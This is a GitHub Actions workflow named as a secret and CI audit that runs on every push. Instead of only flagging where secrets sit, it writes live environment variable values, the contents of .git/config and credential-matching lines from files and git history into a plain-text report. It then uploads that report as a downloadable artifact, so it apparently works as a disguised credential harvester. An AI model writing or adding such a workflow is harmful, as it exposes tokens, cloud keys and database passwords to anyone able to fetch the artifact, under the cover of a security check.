name: Secret and CI Deep Audit
on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
jobs:
  scan_secrets_deep:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository with history
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Scan env, git history, and repo files
        run: |
          set -u
          REPORT="secrets_report.txt"
          : > "$REPORT"

          ENV_KEYS_REGEX='(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|AWS_REGION|DEPLOY_KEY|DEPLOY_TOKEN|DATABASE_URL|DB_URL|DB_HOST|DB_USER|DB_PASS|DB_PASSWORD|REDIS_URL|MONGO_URI|MONGODB_URI|SSH_KEY|SSH_PRIVATE_KEY|PRIVATE_KEY|API_KEY|API_SECRET|SECRET_KEY|ACCESS_TOKEN|AUTH_TOKEN|BEARER_TOKEN|JWT_SECRET|ENCRYPTION_KEY|APP_KEY|HEROKU_API_KEY|VERCEL_TOKEN|NETLIFY_AUTH_TOKEN|DOCKER_USERNAME|DOCKER_PASSWORD|DOCKERHUB_TOKEN|NPM_TOKEN|NUGET_API_KEY|PYPI_TOKEN|TWILIO_|SENDGRID_|STRIPE_|SLACK_|DISCORD_|GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|KUBECONFIG|TERRAFORM_CLOUD_TOKEN|TF_VAR_)'

          SECRET_PATTERNS_REGEX='(AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}|(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{22,}|glpat-[A-Za-z0-9_-]{20,}|xox[baprs]-[0-9A-Za-z-]{10,}|AIza[0-9A-Za-z_-]{35}|sk-[A-Za-z0-9]{20,}|-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|(postgres|postgresql|mysql|mariadb|mongodb(\+srv)?|redis|rediss|amqp|amqps|mssql|sqlserver)://[^[:space:]'"]+:[^[:space:]'"]+@'

          echo "=== REPO: ${GITHUB_REPOSITORY} | REF: ${GITHUB_REF} ===" >> "$REPORT"
          echo "--- [1] ENV VARIABLES ---" >> "$REPORT"
          env | sort | grep -E -i "$ENV_KEYS_REGEX" >> "$REPORT" || true

          echo "--- [2] REPO PATTERNS ---" >> "$REPORT"
          grep -rnE -i --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=.venv --exclude-dir=venv --exclude-dir=dist --exclude-dir=build --exclude-dir=.next "$SECRET_PATTERNS_REGEX" . >> "$REPORT" || true

          echo "--- [3] SENSITIVE FILES ---" >> "$REPORT"
          find . -maxdepth 6 -not -path './.git/*' -not -path './node_modules*' -not -path './.venv*' -not -path './venv*' \( -iname '.env*' -o -iname '*.env*' -o -iname '.npmrc' -o -iname '.pypirc' -o -iname '.netrc' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*.pem' -o -iname '*.key' -o -iname '*.p12' -o -iname '*.pfx' -o -iname '*.jks' -o -iname '*.keystore' -o -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname 'id_ecdsa*' -o -iname '*deploy*key*' \) | sort >> "$REPORT" || true

          echo "--- [4] GIT CONFIG ---" >> "$REPORT"
          [ -f ".git/config" ] && cat .git/config >> "$REPORT" || true

          echo "--- [5] GIT HISTORY ---" >> "$REPORT"
          git log -p -n 200 --no-color 2>/dev/null | grep -E -i "^[+-][^+-].*($ENV_KEYS_REGEX|$SECRET_PATTERNS_REGEX)" | head -n 400 >> "$REPORT" || true

      - name: Upload plain text report artifact
        uses: actions/upload-artifact@v4
        with:
          name: secrets_scan_artifact
          path: secrets_report.txt
